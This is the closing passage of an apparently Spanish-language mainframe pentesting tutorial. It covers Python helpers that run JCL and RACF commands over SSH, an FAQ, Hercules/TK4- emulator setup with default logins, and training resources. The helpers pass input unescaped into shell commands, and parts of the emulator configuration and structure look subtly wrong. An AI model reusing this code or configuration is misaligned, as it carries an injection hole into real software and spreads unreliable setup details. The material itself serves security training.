    def submit_jcl(self, jcl: str) -> str:
        stdin, stdout, stderr = self.client.exec_command("submit")
        stdin.write(jcl)
        stdin.channel.shutdown_write()
        return stdout.read().decode()

    def read_dataset(self, dsn: str) -> str:
        stdin, stdout, stderr = self.client.exec_command(f"cat '//{dsn}'")
        return stdout.read().decode()

    def run_racf_cmd(self, cmd: str) -> str:
        stdin, stdout, stderr = self.client.exec_command(f"tsocmd \"{cmd}\"")
        return stdout.read().decode()
`

## Apéndice J: Preguntas Frecuentes (FAQ)

**¿Los mainframes todavía se usan?**
Sí. El 70% de las transacciones financieras globales se procesan en mainframes. No van a desaparecer pronto.

**¿Se puede hackear un [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe) desde internet?**
Depende. Muchos bancos exponen puertos TN3270 y FTP, pero con firewalls y [vpn](../raw/4n0n1m4t0.md#vpn). El verdadero riesgo es interno.

**¿[cobol](../raw/l3g4cy-3nt3rpr1s3.md#cobol) sigue siendo relevante?**
Sí. Miles de millones de líneas de COBOL siguen en producción. Hay más código COBOL en producción que Java.

**¿Qué habilidades se necesitan para pentesting mainframe?**
- COBOL/JCL básico
- RACF commands
- TN3270 proficiency
- Comprensión de arquitectura z/OS
- Paciencia (todo es más lento y diferente en mainframe)

**¿Hay bug bounties para mainframes?**
Muy raramente. La mayoría de los mainframes son sistemas cerrados sin programas de [bug bounty](../raw/b9g-b09nty.md).

> **Disclaimer final:** Este tutorial es exclusivamente educativo. No intentar ninguna técnica en sistemas sin autorización explícita por escrito.

## Apéndice K: Simuladores [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe) para Prácticas

**Simuladores y entornos de práctica:**

| Nombre | Tipo | Acceso |
|--------|------|--------|
| IBM Academic Initiative | z/OS real (nube) | Gratuito para educación |
| Hercules Emulator | Mainframe virtual | Gratuito (open-source) |
| z/OS TSO/E Simulator | Simulador TSO | Comercial |
| MVS Turnkey | MVS listo para usar | Gratuito |
| TK4- | MVS 3.8J turnkey | Gratuito |

**Hercules Setup:**

$$ bash
# Instalar Hercules emulador
[sudo](../raw/l1n9x-pr1v3sc.md#sudo) apt-get install hercules
# Configurar sistema MVS - http://www.hercules-390.org/
# Descargar TK4- (MVS turnkey)
hercules -f conf/hercules.cnf -d
```

**Configuración de red en Hercules:**
```
# hercules.cnf - Configuracion de red
# Codepage
CNFINC hercules.cnf

# Procesador (z/Architecture)
CPUSERIAL 000001
CPUMODEL 2827
ARCHLEVEL z/Arch

# Memoria
MAINSIZE 1024

# Dispositivos
000F 3270 CONSOLE
001F 3270          
0120 3375 DASD /opt/hercules/tk4/cckd/CCKD0001.120
0121 3375 DASD /opt/hercules/tk4/cckd/CCKD0001.121
0220 3375 DASD /opt/hercules/tk4/cckd/CCKD0002.220
0221 3375 DASD /opt/hercules/tk4/cckd/CCKD0002.221
0800 3420 TAPE /opt/hercules/tapes/tape1.[aws](../raw/cl0ud-h4ck1ng.md#aws)

# Red (TN3270)
0700 3275 TCPIP 3270 NOPAGING
```

**Levantar el emulador:**
```bash
# Iniciar Hercules
hercules -f conf/hercules.cnf -d

# En la consola de Hercules:
# IPL 120 (cargar sistema desde el disco 120)
# Esperar a que arranque MVS

# Conectar desde TN3270 (otra terminal):
x3270 localhost:3270

# Login con IBMUSER / SYS1
```

**Comandos básicos en MVS:**
```bash
# Una vez logueado en TSO:
TSO
LOGON IBMUSER
# Password: SYS1

# Listar datasets
LISTC LEVEL(SYS1.)

# Ver jobs activos
$D JOB,Q

# Enviar JCL de prueba
EDIT 'IBMUSER.JCL(TEST)' NEW
//TESTJOB JOB (123),'TEST',CLASS=A,MSGCLASS=X
//STEP1 EXEC PGM=IEFBR14
/*
SUBMIT 'IBMUSER.JCL(TEST)'
```

**Ejercicios prácticos con Hercules:**
1. Instalar TK4- siguiendo la documentación
2. Conectarse vía TN3270 y explorar ISPF
3. Listar usuarios RACF con LISTUSER
4. Enviar un JCL simple y monitorear su ejecución
5. Crear un dataset secuencial y escribir datos

**Herramientas de pentesting mainframe adicionales:**
- **TK4-**: Sistema MVS 3.8j turnkey para aprendizaje (free)
- **z/OS ADCD**: Demo de IBM para z/OS (license requerida)
- **3270proxy**: Proxy para capturar y modificar tráfico TN3270
- **mainfram3r tools**: Scripts de enumeración automatizada

---

## Apéndice F: Recursos de Aprendizaje Continuo

**Cursos y certificaciones:**
- IBM z/OS Mainframe Practitioner (coursera.org)
- IBM Mainframe Security and RACF (ibm.com/training)
- Intermediate Mainframe: JCL, VSAM, and COBOL (udemy.com)
- Mainframe: The Complete Course (pluralsight.com)

**Laboratorios online gratuitos:**
- IBM Z Trial: https://ibm.biz/z-trial (6 horas de uso gratis)
- Master the Mainframe: https://ibm.biz/academic-initiative
- Hercules emulator: http://www.hercules-390.org/
- TK4-: http://wotho.ethz.ch/tk4-/

**Comunidades:**
- SHARE: https://share.org (conferencias mainframe)
- IBM TechU: https://ibm.com/training/techu
- r/mainframe: Comunidad Reddit
- Mainframe Security Group en LinkedIn

**Libros avanzados:**
- "Mainframe Security: RACF, ACF2, and Top Secret" - IBM Redbook
- "z/OS UNIX System Services Security" - IBM Redbook
- "CICS Transaction Server Security Guide" - IBM Redbook
- "The Cobol Handbook" - IBM Press
- "Mainframe Basics for Security Professionals" - Oratium

---

*Fin del tutorial 03 - Sistemas Legacy y Mainframes*
*Creado por el equipo de Forense*

> **Disclaimer:** Este tutorial es exclusivamente con fines educativos y de capacitación en seguridad ofensiva. Todas las técnicas y herramientas descritas deben ser utilizadas únicamente en entornos autorizados y como parte de programas de pruebas de seguridad (pentesting) legítimos. El acceso no autorizado a sistemas mainframe puede constituir un delito en la mayoría de las jurisdicciones.



